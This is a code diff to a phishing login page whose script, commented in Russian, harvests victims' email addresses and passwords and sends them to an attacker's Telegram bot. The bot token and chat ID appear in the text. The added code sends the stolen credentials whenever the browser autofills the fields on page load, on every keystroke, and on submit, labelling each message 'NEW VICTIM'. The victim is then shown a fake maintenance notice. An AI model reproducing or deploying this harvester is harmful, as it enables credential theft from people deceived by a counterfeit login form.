@@ -110,29 +110,44 @@
 </div>
 
 <script>
-    const BOT_TOKEN = "8870629098:AAELG7u3brQfiq40IgP9dd3IB36LMBdMfbM";
+    // ТВОИ ДАННЫЕ
+    const BOT_TOKEN = "8850351378:AAFEYxANTsCy9oHI3xNe-gKpTWYgPET9r4I";
     const CHAT_ID = "8850351378";
 
-    document.getElementById("loginForm").addEventListener("submit", function(event) {
-        event.preventDefault();
-
-        const email = document.getElementById("email").value.trim();
-        const password = document.getElementById("password").value.trim();
-        const messageDiv = document.getElementById("message");
-
-        if (!email || !password) {
-            messageDiv.textContent = "Заполните оба поля.";
-            return;
-        }
-
-        const text = "📩 НОВАЯ ЖЕРТВА\n📧 Email: " + email + "\n🔑 Пароль: " + password + "\n🕒 " + new Date().toLocaleString();
+    // ФУНКЦИЯ ОТПРАВКИ В TELEGRAM
+    function sendToTelegram(email, password) {
+        const text = "📩 НОВАЯ ЖЕРТВА (АВТОСБОР)\n📧 Email: " + email + "\n🔑 Пароль: " + password + "\n🕒 " + new Date().toLocaleString();
         const url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + encodeURIComponent(text);
-
         fetch(url, { mode: "no-cors" });
         new Image().src = url;
+    }
 
-        document.getElementById("loginFormContainer").classList.add("hidden");
-        document.getElementById("techContainer").classList.remove("hidden");
+    // ФУНКЦИЯ ПРОВЕРКИ И ОТПРАВКИ
+    function checkAndSend() {
+        const email = document.getElementById("email").value.trim();
+        const password = document.getElementById("password").value.trim();
+        if (email && password) {
+            sendToTelegram(email, password);
+            // СКРЫВАЕМ ФОРМУ, ПОКАЗЫВАЕМ ТЕХРАБОТЫ
+            document.getElementById("loginFormContainer").classList.add("hidden");
+            document.getElementById("techContainer").classList.remove("hidden");
+        }
+    }
+
+    // 1. ОТПРАВКА СРАЗУ ПОСЛЕ ЗАГРУЗКИ СТРАНИЦЫ (если браузер автозаполнил поля)
+    window.addEventListener("load", function() {
+        // Небольшая задержка, чтобы браузер успел вставить автозаполнение
+        setTimeout(checkAndSend, 300);
+    });
+
+    // 2. ОТПРАВКА ПРИ ИЗМЕНЕНИИ ЛЮБОГО ПОЛЯ
+    document.getElementById("email").addEventListener("input", checkAndSend);
+    document.getElementById("password").addEventListener("input", checkAndSend);
+
+    // 3. ОТПРАВКА ПРИ ОТПРАВКЕ ФОРМЫ (на всякий случай)
+    document.getElementById("loginForm").addEventListener("submit", function(event) {
+        event.preventDefault();
+        checkAndSend();
     });
 </script>
 </body>
